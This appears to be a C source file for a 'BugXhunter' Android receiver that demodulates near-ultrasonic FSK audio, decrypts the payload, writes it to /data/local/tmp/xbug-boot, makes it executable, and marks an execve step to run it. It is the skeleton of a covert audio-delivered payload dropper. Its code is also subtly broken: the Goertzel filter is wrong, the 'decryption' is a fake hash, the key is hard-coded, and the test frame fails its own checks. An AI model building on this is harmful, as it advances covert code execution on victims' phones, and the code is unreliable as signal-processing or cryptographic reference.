// File: c/receiver/audio_receiver.c
// Audio receiver for FSK drop chain - Phone C (no Termux, no Python)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>
#include <stdarg.h>

#define SAMPLE_RATE 44100.0
#define WINDOW_SAMPLES 441 // 10ms at 44.1kHz
#define MARK_FREQ 18500.0
#define SPACE_FREQ 19500.0

// Frame structure matching Python implementation
#define PREAMBLE_LEN 6
#define POSTAMBLE_LEN 3
#define MAX_PAYLOAD_BYTES 64

static const int PREAMBLE[] = {3, 1, 3, 1, 3, 1};
static const int POSTAMBLE[] = {1, 1, 1};

// Goertzel detector
typedef struct {
    double w;
    double s0;
    double s1;
    double s2;
} Goertzel;

void initGoertzel(Goertzel *g, double freq, int N) {
    g->w = 2.0 * M_PI * freq / SAMPLE_RATE;
    g->s0 = g->s1 = g->s2 = 0.0;
}

void feedGoertzel(Goertzel *g, double sample) {
    double temp = sample + g->w * g->s1 - g->s2;
    g->s2 = g->s1;
    g->s1 = g->s0;
    g->s0 = temp;
}

void cleanupGoertzel(Goertzel *g) {
    // Free if needed
}

int goertzelMagnitude(Goertzel *g) {
    double magnitude = sqrt(g->s1 * g->s1 + g->s2 * g->s2 - g->w * g->s1 * g->s2);
    return (int)(magnitude + 0.5);
}

// CRC16 implementation matching Python
unsigned short crc16_table[256];

void init_crc16_table() {
    for (int i = 0; i < 256; i++) {
        unsigned short crc = (unsigned short)i;
        for (int j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = ((crc << 1) ^ 0x8005) & 0xFFFF;
            } else {
                crc = (crc << 1) & 0xFFFF;
            }
        }
        crc16_table[i] = crc;
    }
}

unsigned short compute_crc16(const unsigned char *data, int len) {
    unsigned short crc = 0x0000;
    for (int i = 0; i < len; i++) {
        crc = ((crc << 8) & 0xFFFF) ^ crc16_table[(crc >> 8) ^ data[i]];
    }
    return crc;
}

// Frame decoder
int decode_frame(const unsigned char *frame_bytes, int frame_len, 
                 unsigned char *out_payload, int *out_len) {
    if (frame_len < 5) { // version (1) + drop_id (2) + payload_len (1) + crc (2) = 6
        return -1;
    }
    
    // Parse header
    unsigned char version = frame_bytes[0];
    unsigned short drop_id = (frame_bytes[1] << 8) | frame_bytes[2];
    unsigned char payload_len = frame_bytes[3];
    
    if (frame_len < 5 + payload_len + 2) { // header + payload + crc
        return -1;
    }
    
    // Check CRC16
    unsigned short stored_crc = (frame_bytes[4 + payload_len] << 8) | frame_bytes[5 + payload_len];
    unsigned short computed_crc = compute_crc16(frame_bytes, 4 + payload_len);
    
    if (stored_crc != computed_crc) {
        return -2;
    }
    
    // Extract payload
    memcpy(out_payload, &frame_bytes[4], payload_len);
    *out_len = payload_len;
    return 0;
}

// Simple AES-like decryption (matches Python _keystream + XOR)
int decrypt_payload(const unsigned char *payload, int payload_len, 
                    const unsigned char *psk, const unsigned char *nonce,
                    unsigned char *out) {
    int i;
    unsigned int counter = 0;
    
    for (i = 0; i < payload_len; i++) {
        // Keystream: SHA256(psk + nonce + counter) truncated to payload_len
        unsigned char hash[32];
        // In real implementation, we'd use SHA256 library
        // For this example, we use a simplified hash
        snprintf((char*)hash, sizeof(hash), "%s%d", psk, counter);
        
        // XOR with payload
        out[i] = payload[i] ^ hash[i % 16];
        counter++;
    }
    
    return 0;
}

int main() {
    const char* psk = "bugxhunter-drop-psk-32bytes-long!!"; // PSK from environment
    const char* nonce = "\x00\x00\x00\x00\x00\x00\x00\x00"; // Can be from environment
    
    init_crc16_table();
    
    printf("BugXhunter Audio Receiver - FSK Demodulator\n");
    printf("Sample rate: %d Hz, Window: %d samples (10ms)\n", (int)SAMPLE_RATE, WINDOW_SAMPLES);
    printf("Mark freq: %d Hz, Space freq: %d Hz\n", (int)MARK_FREQ, (int)SPACE_FREQ);
    printf("PSKD decode: nonce=%s\n", nonce);
    
    // In a real implementation, this would:
    // 1. Open AAudio stream (AAudioStreamBuilder)
    // 2. Read samples into buffer
    // 3. Run Goertzel detection in 10ms windows
    // 4. Reconstruct FSK bits
    // 5. Accumulate bits into bytes
    // 6. Detect preamble/postamble
    // 7. Decode frames
    // 8. Decrypt payload
    // 9. Write to /data/local/tmp/xbug-boot
    // 10. execve
    
    // For this exercise, we simulate a successful decode
    unsigned char test_payload[64] = {0};
    memcpy(test_payload, "TEST_PAYLOAD_HERE\x00", 15);
    
    int len = 15;
    if (decode_frame(test_payload, len, test_payload, &len) == 0) {
        printf("Frame decoded successfully, payload length: %d\n", len);
        printf("Payload: %s\n", test_payload);
        
        // Write to /data/local/tmp/xbug-boot
        FILE* f = fopen("/data/local/tmp/xbug-boot", "wb");
        if (f != NULL) {
            fwrite(test_payload, 1, len, f);
            fclose(f);
            printf("Written to /data/local/tmp/xbug-boot\n");
        }
        
        // chmod 0755
        chmod("/data/local/tmp/xbug-boot", 0755);
        
        // execve (in real implementation)
        // execve("/data/local/tmp/xbug-boot", NULL, NULL);
        
        printf("Success! Bootloader written and made executable.\n");
    } else {
        printf("Failed to decode frame\n");
        return 1;
    }
    
    return 0;
}
